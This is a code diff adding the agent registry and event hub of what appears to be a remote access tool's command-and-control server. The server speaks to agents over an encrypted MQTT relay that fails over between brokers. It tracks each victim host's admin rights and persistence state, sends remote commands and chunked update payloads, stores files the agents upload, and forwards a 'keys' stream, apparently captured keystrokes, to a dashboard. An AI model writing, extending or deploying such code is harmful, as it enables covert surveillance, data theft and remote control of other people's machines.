@@ -1,0 +1,377 @@
+"""Agent registry and dashboard event bus.
+
+The hub is the single source of truth for "what is connected".  Both the MQTT
+listener and the HTTP API talk to it; nothing else holds agent state.
+"""
+
+from __future__ import annotations
+
+import hashlib
+import json
+import os
+import queue
+import re
+import threading
+import time
+from typing import Any
+from urllib.parse import quote
+
+from .. import config, protocol
+from ..mqtt import MqttClient, random_client_id
+
+
+def safe_name(value: str) -> str:
+    """Filesystem-safe version of a display name."""
+    return re.sub(r"[^A-Za-z0-9._ -]", "_", str(value))[:60] or "agent"
+
+
+class AgentSession:
+    """Everything the controller knows about one connected agent."""
+
+    def __init__(self, agent_id: str, name: str, remote_id: str) -> None:
+        self.id = agent_id
+        self.remote_id = remote_id          # value used in the MQTT topic
+        self.name = name
+        self.nick = ""
+        self.version = "?"
+        self.sha = ""
+        self.path = ""
+        self.pid = 0
+        self.info: dict[str, Any] = {}
+        self.admin = False
+        self.persistence: dict[str, Any] = {}
+        self.stats: dict[str, Any] = {}
+        self.last_seen = time.time()
+        self.connected_at = time.time()
+        self.link_ok = False
+        self.online = True
+
+    @property
+    def display(self) -> str:
+        return self.nick or self.name
+
+    def touch(self) -> None:
+        self.last_seen = time.time()
+        self.online = True
+
+    def to_dict(self) -> dict[str, Any]:
+        return {
+            "id": self.id,
+            "remote_id": self.remote_id,
+            "name": self.name,
+            "nick": self.nick,
+            "display": self.display,
+            "version": self.version,
+            "sha": self.sha,
+            "path": self.path,
+            "pid": self.pid,
+            "info": self.info,
+            "admin": self.admin,
+            "stats": self.stats,
+            "last_seen": self.last_seen,
+            "connected_at": self.connected_at,
+            "link_ok": self.link_ok,
+            "persistence": self.persistence,
+            "online": self.online,
+        }
+
+
+class Hub:
+    """Holds agents, moves messages, publishes dashboard events."""
+
+    def __init__(self, key: bytes, received_root: str, db_path: str = "") -> None:
+        self.key = key
+        self.codec = protocol.Codec(key)
+        self.agents: dict[str, AgentSession] = {}
+        self.reassembler = protocol.Reassembler()
+        self.received_root = os.path.abspath(received_root)
+        self.db_path = db_path or os.path.join(self.received_root, "..", "agents_db.json")
+        self._subscribers: list[queue.Queue[str]] = []
+        self._lock = threading.Lock()
+        self._client: MqttClient | None = None
+        self.relay_up = False
+        self._running = True
+        self._load_db()
+
+    def _load_db(self) -> None:
+        """Load known agents from local JSON database on controller start."""
+        if os.path.isfile(self.db_path):
+            try:
+                with open(self.db_path, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                    for item in data:
+                        agent_id = item.get("id")
+                        if not agent_id:
+                            continue
+                        session = AgentSession(agent_id, item.get("name", "agent"), item.get("remote_id", ""))
+                        session.nick = item.get("nick", "")
+                        session.version = item.get("version", "?")
+                        session.sha = item.get("sha", "")
+                        session.path = item.get("path", "")
+                        session.pid = item.get("pid", 0)
+                        session.info = item.get("info", {})
+                        session.admin = item.get("admin", False)
+                        session.persistence = item.get("persistence", {})
+                        session.stats = item.get("stats", {})
+                        session.last_seen = item.get("last_seen", 0)
+                        session.connected_at = item.get("connected_at", 0)
+                        session.link_ok = False
+                        session.online = False
+                        self.agents[agent_id] = session
+            except Exception:
+                pass
+
+    def _save_db(self) -> None:
+        """Persist registered agents to disk so offline agents are never lost."""
+        try:
+            items = [a.to_dict() for a in self.agents.values()]
+            tmp_path = self.db_path + ".tmp"
+            with open(tmp_path, "w", encoding="utf-8") as f:
+                json.dump(items, f, indent=2)
+            os.replace(tmp_path, self.db_path)
+        except Exception:
+            pass
+
+    # ------------------------------------------------------------------
+    # Storage
+    # ------------------------------------------------------------------
+
+    def agent_folder(self, agent_id: str) -> str:
+        """Folder where this agent's received files live.
+
+        Keyed on the *hostname* rather than the nickname so renaming an agent
+        does not orphan everything it already sent.
+        """
+        agent = self.agents.get(agent_id)
+        folder = os.path.join(self.received_root, safe_name(agent.name if agent else agent_id))
+        os.makedirs(folder, exist_ok=True)
+        return folder
+
+    # ------------------------------------------------------------------
+    # Event bus
+    # ------------------------------------------------------------------
+
+    def subscribe(self) -> queue.Queue[str]:
+        """Register a dashboard listener."""
+        channel: queue.Queue[str] = queue.Queue(maxsize=2048)
+        with self._lock:
+            self._subscribers.append(channel)
+        return channel
+
+    def unsubscribe(self, channel: queue.Queue[str]) -> None:
+        with self._lock:
+            if channel in self._subscribers:
+                self._subscribers.remove(channel)
+
+    def publish(self, event: dict[str, Any]) -> None:
+        """Fan an event out to every dashboard listener."""
+        payload = json.dumps(event, default=str)
+        with self._lock:
+            targets = list(self._subscribers)
+        for channel in targets:
+            try:
+                channel.put_nowait(payload)
+            except queue.Full:
+                pass
+
+    # ------------------------------------------------------------------
+    # Registry
+    # ------------------------------------------------------------------
+
+    def get(self, agent_id: str) -> AgentSession | None:
+        with self._lock:
+            return self.agents.get(agent_id)
+
+    def all(self) -> list[AgentSession]:
+        with self._lock:
+            return list(self.agents.values())
+
+    def rename(self, agent_id: str, nick: str) -> bool:
+        with self._lock:
+            agent = self.agents.get(agent_id)
+            if not agent:
+                return False
+            agent.nick = nick
+            self._save_db()
+            data = agent.to_dict()
+        self.publish({"type": "agent", "agent": data})
+        return True
+
+    def forget_stale(self, timeout: float = config.AGENT_TIMEOUT) -> list[str]:
+        """Mark agents that stopped reporting as offline rather than deleting them."""
+        now = time.time()
+        went_offline = []
+        with self._lock:
+            agent_items = list(self.agents.items())
+        for agent_id, agent in agent_items:
+            if agent.online and (now - agent.last_seen > timeout):
+                agent.online = False
+                agent.link_ok = False
+                went_offline.append(agent_id)
+                self.publish({"type": "agent_offline", "id": agent_id, "agent": agent.to_dict()})
+        if went_offline:
+            with self._lock:
+                self._save_db()
+        return went_offline
+
+    # ------------------------------------------------------------------
+    # Sending
+    # ------------------------------------------------------------------
+
+    def send(self, agent_id: str, message: dict[str, Any]) -> bool:
+        """Seal and publish a message to one agent."""
+        agent = self.agents.get(agent_id)
+        if not agent or not self._client or not self._client.alive:
+            return False
+        try:
+            self._client.publish(config.topic_down(agent.remote_id),
+                                 self.codec.encode(message), qos=1)
+            return True
+        except Exception:
+            return False
+
+    def broadcast(self, message: dict[str, Any]) -> int:
+        """Send a message to every connected agent."""
+        return sum(1 for agent_id in list(self.agents) if self.send(agent_id, message))
+
+    def send_chunks(self, agent_id: str, kind: str, payload: bytes,
+                    filename: str = "", destination: str = "") -> int:
+        """Send a chunked payload, returning the number of chunks."""
+        transfer = os.urandom(4).hex()
+        parts = protocol.chunk(payload, transfer)
+        digest = hashlib.sha256(payload).hexdigest()
+        for index, part in enumerate(parts):
+            message: dict[str, Any] = {"t": kind, "name": filename,
+                                       "dest": destination, **part}
+            if kind == "update":
+                message["sha"] = digest
+                message["proto"] = 1
+            self.send(agent_id, message)
+            if len(parts) > 4 and index % 4 == 0:
+                time.sleep(0.01)
+        return len(parts)
+
+    # ------------------------------------------------------------------
+    # Receiving
+    # ------------------------------------------------------------------
+
+    def _on_message(self, topic: str, payload: bytes) -> None:
+        try:
+            message = self.codec.decode(payload)
+        except Exception:
+            return
+
+        remote_id = topic.rsplit("/", 1)[-1]
+        agent_id = "agent:" + remote_id
+
+        if message.get("t") == "hello":
+            self._register(agent_id, remote_id, message)
+            return
+
+        agent = self.agents.get(agent_id)
+        if not agent:
+            return
+        agent.touch()
+
+        kind = message.get("t")
+        if kind == "bye":
+            agent.online = False
+            agent.link_ok = False
+            self.publish({"type": "agent_offline", "id": agent_id, "agent": agent.to_dict()})
+            self._save_db()
+            return
+        elif kind == "out":
+            if not agent.link_ok:
+                agent.link_ok = True
+                self.publish({"type": "link", "id": agent_id, "ok": True})
+            self.publish({"type": "output", "id": agent_id, "text": message.get("d", "")})
+        elif kind == "json":
+            self.publish({"type": "json", "id": agent_id, "payload": message})
+        elif kind == "evt":
+            if message.get("k") == "stat":
+                agent.stats = message
+                self.publish({"type": "stats", "id": agent_id, "stats": message})
+        elif kind == "keys":
+            self.publish({"type": "keys", "id": agent_id, "text": message.get("d", "")})
+        elif kind == "note":
+            self.publish({"type": "note", "id": agent_id, "text": message.get("d", "")})
+        elif kind == "progress":
+            self.publish({"type": "progress", "id": agent_id, "text": message.get("d", "")})
+        elif kind == "file":
+            self._store_file(agent, message)
+
+    def _register(self, agent_id: str, remote_id: str, message: dict[str, Any]) -> None:
+        with self._lock:
+            agent = self.agents.get(agent_id)
+            if agent is None:
+                agent = AgentSession(agent_id, message.get("name", remote_id), remote_id)
+                self.agents[agent_id] = agent
+                is_new = True
+            else:
+                is_new = False
+
+        agent.touch()
+        agent.remote_id = message.get("id", remote_id)
+        agent.version = message.get("ver", agent.version)
+        agent.sha = message.get("sha", agent.sha)
+        agent.path = message.get("path", agent.path)
+        agent.pid = message.get("pid", agent.pid)
+        agent.info = message.get("info", agent.info)
+        agent.admin = bool(message.get("admin", agent.admin))
+        agent.persistence = message.get("persistence", agent.persistence)
+        self._save_db()
+
+        if is_new:
+            self.publish({"type": "agent_new", "agent": agent.to_dict()})
+            threading.Timer(1.5, self._probe, args=(agent_id,)).start()
+        else:
+            self.publish({"type": "agent", "agent": agent.to_dict()})
+
+    def _probe(self, agent_id: str) -> None:
+        """Ask a fresh agent for its version so we can prove the link works."""
+        self.send(agent_id, {"t": "cmd", "d": "ver"})
+
+    def _store_file(self, agent: AgentSession, message: dict[str, Any]) -> None:
+        data = self.reassembler.feed(message, time.time())
+        if data is None:
+            return
+        name = os.path.basename(message.get("name", "file.bin"))
+        path = os.path.join(self.agent_folder(agent.id), name)
+        with open(path, "wb") as handle:
+            handle.write(data)
+        self.publish({
+            "type": "file",
+            "id": agent.id,
+            "name": name,
+            "size": len(data),
+            "url": f"/files/{quote(agent.id, safe='')}/{quote(name, safe='')}",
+        })
+
+    # ------------------------------------------------------------------
+    # Relay
+    # ------------------------------------------------------------------
+
+    def start_relay(self) -> None:
+        """Connect to a broker and keep reconnecting."""
+        threading.Thread(target=self._relay_loop, name="relay", daemon=True).start()
+
+    def _relay_loop(self) -> None:
+        while self._running:
+            for host, port, use_tls in config.broker_order():
+                try:
+                    client = MqttClient(random_client_id("syspy-c"), self._on_message)
+                    client.connect(host, port, use_tls)
+                    client.subscribe(config.ROOM + "/up/+", qos=1)
+                    self._client = client
+                    self.relay_up = True
+                    self.publish({"type": "relay", "up": True, "broker": f"{host}:{port}"})
+                    while client.alive and self._running:
+                        time.sleep(1)
+                    self.relay_up = False
+                    self.publish({"type": "relay", "up": False})
+                except Exception:
+                    continue
+            time.sleep(3)
+
+    def stop(self) -> None:
+        self._running = False
